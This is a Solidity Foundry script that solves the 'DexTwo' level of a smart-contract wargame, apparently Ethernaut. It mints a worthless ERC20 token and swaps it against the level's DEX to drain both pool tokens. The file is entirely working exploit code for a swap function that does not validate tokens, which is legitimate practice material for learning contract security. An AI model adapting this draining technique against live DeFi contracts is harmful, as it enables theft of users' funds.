// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/levels/23-DexTwo/DexTwo.sol";
import "openzeppelin-contracts/token/ERC20/ERC20.sol";


contract ExploitScript is Script {
    ZombieToken ZombieTokenContract;
    DexTwo level23 = DexTwo(payable(0x885b0F838BF4fE1933264fb4b539EaEE615A08bb));

    function run() public {
        vm.startBroadcast();
        ZombieTokenContract = new ZombieToken(); //deploy erc20
        ZombieTokenContract.transfer(address(level23),100);
        ZombieTokenContract.approve(address(level23),1000);
        address token1 = level23.token1();
        address token2 = level23.token2();
        level23.swap(address(ZombieTokenContract), token1, 100);
        level23.swap(address(ZombieTokenContract), token2, 200);

        console.log("Remaining token1 balance : ", level23.balanceOf(token1, address(level23)));
        console.log("Remaining token2 balance : ", level23.balanceOf(token2, address(level23)));
    

        vm.stopBroadcast();
    }
}
contract ZombieToken is ERC20 {
    constructor() ERC20("ZombieToken", "ZTN") public {
        _mint(msg.sender, 400);
    }
}
